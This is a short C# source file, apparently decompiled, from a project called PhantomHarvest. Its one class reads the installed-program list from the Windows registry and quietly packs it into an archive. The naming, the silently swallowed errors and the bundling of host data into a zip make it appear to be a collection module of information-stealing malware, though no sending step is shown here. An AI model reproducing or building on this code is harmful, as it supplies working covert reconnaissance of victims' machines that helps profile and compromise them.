using System;
using System.IO;
using System.Text;
using Microsoft.Win32;
using PhantomHarvest.Helper;

namespace PhantomHarvest.SystemInfos
{
	// Token: 0x0200000F RID: 15
	internal class InstalledApp
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string info = InstalledApp.GetInfo();
				if (!string.IsNullOrEmpty(info))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(info)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, InstalledApp.SystemInfoName + "/InstalledApp.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		public static string GetInfo()
		{
			StringBuilder stringBuilder = new StringBuilder();
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
				{
					if (registryKey != null)
					{
						foreach (string name in registryKey.GetSubKeyNames())
						{
							try
							{
								using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
								{
									string text = (registryKey2 != null) ? registryKey2.GetValue("DisplayName", "Error").ToString() : null;
									if (!string.IsNullOrEmpty(text) && text != "Error" && !text.Contains("Windows"))
									{
										stringBuilder.AppendLine(text);
									}
								}
							}
							catch {}
						}
					}
				}
			}
			catch
			{
			}
			return stringBuilder.ToString();
		}

		public static string SystemInfoName = "InstalledApp";
	}
}
